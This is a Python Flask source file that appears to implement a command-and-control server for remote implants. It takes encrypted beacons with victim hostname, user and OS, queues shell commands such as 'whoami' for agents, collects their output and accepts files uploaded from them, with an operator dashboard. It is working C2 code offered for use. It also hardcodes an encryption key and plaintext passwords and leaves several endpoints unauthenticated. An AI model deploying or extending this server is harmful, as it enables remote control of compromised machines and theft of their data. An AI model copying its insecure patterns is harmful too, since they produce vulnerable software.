import os
import json
import uuid
from flask import Flask, request, jsonify, render_template, session, redirect, url_for, send_from_directory
from werkzeug.utils import secure_filename
from cryptography.fernet import Fernet
from dotenv import load_dotenv
from datetime import datetime, timezone
app = Flask(__name__)
load_dotenv()

API_KEY = os.getenv("API_KEY")


# --- Configuration ---
SECRET_KEY = b'8zQ0wY9DwMZ5N63DR-3h9C7F5htGvA2I7ReG0i8ER6U='
cipher = Fernet(SECRET_KEY)
UPLOAD_FOLDER = 'upload'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.secret_key = SECRET_KEY

# --- Users ---
users = {"admin": "password123", "user1": "pass1"}

# --- Tasks dictionary keyed by UUID ---
tasks = {
    uuid.uuid4(): {"agent_id": "1", "task": {"type": "shell", "command": "whoami"}, "output": None}
}

# --- Live Agents dictionary ---
agents = {}  # {agent_id: {'hostname':..., 'user':..., 'os':..., 'ip':..., 'last_seen': datetime}}

# --- Encryption functions ---
def encrypt_data(data):
    return cipher.encrypt(data.encode()).decode()

def decrypt_data(data):
    return cipher.decrypt(data.encode()).decode()

# --- Agent beacon endpoint ---
@app.route('/beacon', methods=['POST'])
def beacon():
    encrypted = request.json.get('data')
    decrypted_json = decrypt_data(encrypted)
    beacon_info = json.loads(decrypted_json)
    agent_id = beacon_info.get("id")

    # Store last_seen as datetime
    agents[agent_id] = {
        "hostname": beacon_info.get("hostname"),
        "user": beacon_info.get("user"),
        "os": beacon_info.get("os"),
        "ip": request.remote_addr,
        "last_seen": datetime.utcnow()
    }

    # Return first pending task for this agent
    for task_uuid, t in tasks.items():
        if t["agent_id"] == agent_id and t["output"] is None:
            return jsonify({'task': t["task"], "uuid": str(task_uuid)})

    return jsonify({'task': None})

# --- Live agents API ---
AGENT_ONLINE_TIMEOUT = 30  # seconds

@app.route("/agents-data")
def agents_data():
    now = datetime.utcnow()
    data = []

    for agent_id, agent in agents.items():
        last_seen = agent['last_seen']
        online = (now - last_seen).total_seconds() <= AGENT_ONLINE_TIMEOUT
        data.append({
            "id": agent_id,
            "hostname": agent.get("hostname", ""),
            "user": agent.get("user", ""),
            "os": agent.get("os", ""),
            "ip": agent.get("ip", ""),
            "last_seen": last_seen.timestamp(),
            "online": online
        })

    return jsonify(data)

# --- Agents page ---
@app.route('/agents/')
def agents_list():
    if "username" not in session:
        return redirect(url_for("login"))

    now = datetime.utcnow()
    agent_rows = []

    for agent_id, agent in agents.items():
        last_seen = agent['last_seen']
        online = (now - last_seen).total_seconds() <= AGENT_ONLINE_TIMEOUT
        pending_tasks = sum(1 for t in tasks.values() if t["agent_id"] == agent_id and t["output"] is None)
        agent_rows.append({
            "id": agent_id,
            "status": "online" if online else "offline",
            "last_seen": last_seen.strftime("%Y-%m-%d %H:%M:%S"),
            "pending_tasks": pending_tasks
        })

    return render_template('agents.html', agents=agent_rows)

# --- Agent detail page ---
@app.route('/agents/<agent_id>')
def agent_detail(agent_id):
    if "username" not in session:
        return redirect(url_for("login"))

    agent_tasks = []
    for task_uuid, t in tasks.items():
        if t['agent_id'] == agent_id:
            agent_tasks.append({
                "uuid": str(task_uuid),
                "task": t['task'],
                "output": t['output']
            })
    return render_template('agent_detail.html', agent_id=agent_id, tasks=agent_tasks)

# --- Agent result endpoint ---
@app.route('/result', methods=['POST'])
def result():
    encrypted = request.json.get('data')
    decrypted_json = decrypt_data(encrypted)
    result_info = json.loads(decrypted_json)

    agent_id = result_info.get('id')
    output = result_info.get('output')
    task_uuid_str = result_info.get('uuid')

    try:
        task_uuid = uuid.UUID(task_uuid_str)
        if task_uuid in tasks:
            tasks[task_uuid]["output"] = output
            print(f"[+] Result from Agent {agent_id}, Task {task_uuid}: {output}")
    except Exception:
        print(f"[!] Invalid UUID from agent: {task_uuid_str}")

    return jsonify({"status": "received"})

# --- Add a task ---
@app.route('/task', methods=['POST'])
def add_task():
    auth_header = request.headers.get("Authorization")
    if auth_header != f"Bearer {API_KEY}":
        return jsonify({"error": "Unauthorized"}), 401

    data = request.get_json()
    agent_id = data.get("id")
    command = data.get("task")

    if not agent_id or not command:
        return jsonify({"error": "Missing id or command"}), 400

    task_uuid = uuid.uuid4()
    tasks[task_uuid] = {"agent_id": agent_id, "task": command, "output": None}
    return jsonify({"status": "accepted", "uuid": str(task_uuid)})

# --- File upload ---
@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    filename = secure_filename(file.filename)
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(filepath)
    return f'[+] File {file.filename} successfully uploaded', 200

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    if "username" not in session:
        return redirect(url_for("login"))
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

@app.route('/uploads/')
def uploads_list():
    if "username" not in session:
        return redirect(url_for("login"))
    files = [f for f in os.listdir(app.config['UPLOAD_FOLDER']) if os.path.isfile(os.path.join(app.config['UPLOAD_FOLDER'], f))]
    return render_template("uploads.html", files=files)

# --- Login / Logout ---
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        if username in users and users[username] == password:
            session["username"] = username
            return redirect(url_for("dashboard"))
        return render_template("login.html", error="Invalid credentials")
    return render_template("login.html")

@app.route("/logout")
def logout():
    session.pop("username", None)
    return redirect(url_for("login"))

# --- Dashboard ---
AGENT_ONLINE_TIMEOUT = 30  # seconds

@app.route("/dashboard")
def dashboard():
    if "username" not in session:
        return redirect(url_for("login"))

    files = os.listdir(app.config['UPLOAD_FOLDER'])

    # Convert UUID keys to strings for template
    tasks_str = {str(k): v for k, v in tasks.items()}

    now = datetime.now(timezone.utc)
    agent_rows = []
    for agent_id, agent in agents.items():
        last_seen_dt = agent['last_seen']  # already datetime
        if last_seen_dt.tzinfo is None:
            last_seen_dt = last_seen_dt.replace(tzinfo=timezone.utc)

        online = (now - last_seen_dt).total_seconds() <= AGENT_ONLINE_TIMEOUT

        agent_rows.append({
            "id": agent_id,
            "hostname": agent.get("hostname", ""),
            "user": agent.get("user", ""),
            "os": agent.get("os", ""),
            "ip": agent.get("ip", ""),
            "last_seen": last_seen_dt.strftime("%Y-%m-%d %H:%M:%S"),
            "status": "online" if online else "offline"
        })



    return render_template(
        "dashboard.html",
        files=files,
        api_key=API_KEY,
        agents=agent_rows,
        tasks=tasks_str
    )
# --- Tasks endpoints ---
@app.route("/tasks-data")
def tasks_data():
    if "username" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    return jsonify({str(k): v for k, v in tasks.items()})

@app.route('/tasks/')
def tasks_list():
    if "username" not in session:
        return redirect(url_for("login"))
    tasks_str = {str(k): v for k, v in tasks.items()}
    return render_template('tasks.html', tasks=tasks_str)

@app.route("/delete-task/<task_uuid>", methods=["POST"])
def delete_task(task_uuid):
    if "username" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    try:
        uuid_obj = uuid.UUID(task_uuid)
        if uuid_obj in tasks:
            del tasks[uuid_obj]
            return jsonify({"status": "deleted"})
        else:
            return jsonify({"error": "Task not found"}), 404
    except ValueError:
        return jsonify({"error": "Invalid UUID"}), 400

# --- Main ---
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)